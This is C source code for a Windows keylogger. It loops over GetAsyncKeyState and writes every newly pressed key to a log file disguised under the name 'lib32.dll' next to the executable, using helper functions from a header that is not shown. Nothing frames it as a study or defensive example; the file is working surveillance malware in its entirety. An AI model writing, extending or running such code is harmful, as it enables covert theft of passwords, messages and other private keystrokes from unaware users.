#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <locale.h>
#include <shlwapi.h>

#include "key.h"

#define KEY_LOG "lib32.dll"
#define LEN_NAME 512
#define MAX_STATE 256

int main(int argc, char **argv){
    int i = 0;
    bool is_pressed = false;
    bool state[MAX_STATE] = {false};
    setlocale(LC_ALL, "Russian");
    char path[LEN_NAME] = {'\0'};
    char fullpath[LEN_NAME] = {'\0'};
    GetModuleFileName(NULL, path, LEN_NAME - 1);
    PathRemoveFileSpec(path);
    snprintf(fullpath, LEN_NAME - 1, "%s\\%s", path, KEY_LOG);
    while(true){
        for(i = 8; i < MAX_STATE; i++){
            is_pressed = (GetAsyncKeyState(i) & 0x8000) != 0;
            if(is_pressed && state[i] == false)
                save_file(fullpath, key_value(i));
            state[i] = is_pressed;
        }
        Sleep(1);
    }
    return 0;
}
